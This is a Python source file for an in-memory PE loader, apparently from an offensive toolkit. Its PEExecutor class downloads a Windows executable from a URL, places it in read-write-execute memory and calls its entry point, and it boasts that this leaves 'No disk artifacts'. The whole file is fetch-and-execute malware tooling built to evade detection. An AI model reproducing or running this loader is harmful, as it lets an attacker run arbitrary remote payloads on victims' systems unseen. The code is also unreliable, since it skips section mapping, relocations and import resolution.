"""
In-Memory PE Execution
Download and execute PE file entirely from memory without touching disk
"""

import ctypes

from ..core.constants import MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE
from ..utils.helpers import parse_pe_header, download_to_memory


class PEExecutor:
    """
    In-Memory PE Execution
    
    Downloads and executes PE files directly in memory
    """
    
    def __init__(self, kernel32):
        """
        Initialize PE executor
        
        Args:
            kernel32: Windows kernel32.dll handle
        """
        self.kernel32 = kernel32
    
    def execute(self, pe_url):
        """
        Download and execute PE from URL
        
        Args:
            pe_url (str): URL to download PE from
            
        Returns:
            bool: True if successful, False otherwise
        """
        try:
            print(f"[+] Downloading PE from: {pe_url}")
            
            # Download PE to memory
            pe_data = download_to_memory(pe_url)
            
            if not pe_data:
                return False
            
            print(f"[+] PE size: {len(pe_data)} bytes")
            
            return self.execute_from_data(pe_data)
        
        except Exception as e:
            print(f"[!] PE execution failed: {e}")
            return False
    
    def execute_from_data(self, pe_data):
        """
        Execute PE from data
        
        Args:
            pe_data (bytes): PE file data
            
        Returns:
            bool: True if successful
        """
        try:
            print(f"[+] Parsing PE headers...")
            
            # Parse PE
            pe_info = parse_pe_header(pe_data)
            
            if not pe_info or not pe_info['is_valid']:
                print(f"[!] Invalid PE file")
                return False
            
            print(f"[+] Image base: 0x{pe_info['image_base']:X}")
            print(f"[+] Image size: {pe_info['image_size']} bytes")
            print(f"[+] Entry point RVA: 0x{pe_info['entry_point_rva']:X}")
            
            # Allocate memory
            memory_address = self._allocate_memory(
                pe_info['image_base'], 
                pe_info['image_size']
            )
            
            if not memory_address:
                return False
            
            # Copy PE to memory
            print(f"[+] Copying PE to memory...")
            ctypes.memmove(memory_address, pe_data, len(pe_data))
            
            # Calculate entry point
            entry_point = memory_address + pe_info['entry_point_rva']
            
            print(f"[+] Entry point: 0x{entry_point:X}")
            print(f"[+] Executing PE from memory...")
            
            # Execute
            try:
                pe_entry = ctypes.CFUNCTYPE(None)(entry_point)
                pe_entry()
                
                print(f"[+] PE executed from memory")
                print(f"[+] No disk artifacts")
                
                return True
            
            except Exception as e:
                print(f"[-] PE execution error: {e}")
                return False
        
        except Exception as e:
            print(f"[!] PE execution failed: {e}")
            return False
    
    def _allocate_memory(self, preferred_base, size):
        """
        Allocate memory for PE
        
        Args:
            preferred_base (int): Preferred base address
            size (int): Size to allocate
            
        Returns:
            int: Allocated address or None
        """
        print(f"[+] Allocating memory...")
        
        # Try to allocate at preferred base
        memory_address = self.kernel32.VirtualAlloc(
            preferred_base,
            size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        )
        
        if not memory_address:
            # Try without preferred base
            print(f"[+] Preferred base not available, trying any address...")
            memory_address = self.kernel32.VirtualAlloc(
                None,
                size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE
            )
        
        if not memory_address:
            print(f"[!] VirtualAlloc failed")
            return None
        
        print(f"[+] Allocated at: 0x{memory_address:X}")
        return memory_address